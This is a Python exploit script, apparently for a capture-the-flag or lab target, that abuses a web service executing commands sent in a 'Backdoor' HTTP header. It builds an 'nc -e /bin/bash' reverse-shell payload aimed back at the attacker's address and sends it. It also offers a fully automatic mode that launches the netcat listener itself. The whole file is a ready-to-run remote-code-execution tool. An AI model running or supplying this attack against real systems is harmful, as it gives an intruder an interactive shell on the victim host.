#!/usr/bin/python3
#incase the script didnt work for you or returned any /bin/sh related errors make sure to change your terminal emulator name down below
#change qterminal otherwise if you have kali linux its there by default
import socket 
import requests
import sys
import ipaddress
import os 
import subprocess
import concurrent.futures
import time
from colorama import Fore

def banner():
    font = """___  ___            _         ______               _         _                     
    |  \/  |           | |        | ___ \             | |       | |                    
    | .  . |  ___    __| |        | |_/ /  __ _   ___ | | __  __| |  ___    ___   _ __ 
    | |\/| | / _ \  / _` |        | ___ \ / _` | / __|| |/ / / _` | / _ \  / _ \ | '__|
    | |  | || (_) || (_| |        | |_/ /| (_| || (__ |   < | (_| || (_) || (_) || |   
    \_|  |_/ \___/  \__,_|        \____/  \__,_| \___||_|\_\ \__,_| \___/  \___/ |_|   
                       ______                                                      
                      |______|    """
    print(Fore.RED+font)

def check_connection(ip,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip,int(port)))
        s.close()
        return True
    except socket.error as e:
        return False
def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False
def check_args():
    if len(sys.argv) > 2:  
        if is_valid_ip(sys.argv[1]):
            return True
        else:
            print("invalid IP")
            return False
    else:
        print("USAGE : ./exploit.py IP PORT REVPORT")
        return False
        sys.exit(1)
def valid_port(port):
    return 1 <= int(port) <= 65355
def run_command(command):
    subprocess.run(command, shell=True)
def exploit(Lhost,Lport,Revport):
    Revhost = subprocess.check_output("ip route get 1 | awk '{print $7}'", shell=True).decode().strip()
    payload = f"nc -e /bin/bash {Revhost} {Revport}"
    listener_cmd= f"nc -lnvp {Revport}"
    url = f'http://{Lhost}:{Lport}'
    headers = {
            "Backdoor": payload
            }
    if not valid_port(Lport) or not valid_port(Revport):
        print(Fore.RED+"Port Unreconized")
        sys.exit(1)
    rev_cmd = f"python3 -c 'import requests; requests.get(\"{url}\", headers={{\"Backdoor\": \"nc -e /bin/bash {Revhost} {Revport}\"}})'"
    print(Fore.GREEN+"Please select Option 1 Or 2")
    print(Fore.GREEN+"1) Fully automatic RCE\n 2) Manual RCE you have to set up the listener : ")
    choice = int(input(Fore.RED+"Choice : "))
    if choice == 1:
        try:
            if check_connection(Lhost,Lport):
                print("Host Found")
                with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                    executor.submit(run_command, f"qterminal -e {listener_cmd}")
                    time.sleep(2)
                    executor.submit(run_command, f"qterminal -e {rev_cmd}")
        except subprocess.CalledProcessError as e:
            print(f"An error occurred: {e}") 
    elif choice == 2:
        if check_connection(Lhost,Lport):
            print(Fore.RED+f"Please Put This Command In Another Terminal : nc -lvp {Revport} ")
            req = requests.get(f'http://{Lhost}:{Lport}',headers=headers)
            print(Fore.GREEN+"Press Enter only if you set up the listener if you want to exit please type "+Fore.YELLOW+"exit")
            l = input(Fore.GREEN+"Press Enter : ") 
            while True:
                if l  == "":
                    exploit(Lhost,Lport,Revport)
                else:
                    if l.lower() == 'exit':
                       sys.exit(1) 
                    else:
                        l = input(Fore.GREEN+"Press Enter : ") 
                        
            
def main():
    if check_args():
        exploit(sys.argv[1],sys.argv[2],sys.argv[3])

if __name__ == '__main__':
    banner()
    main()

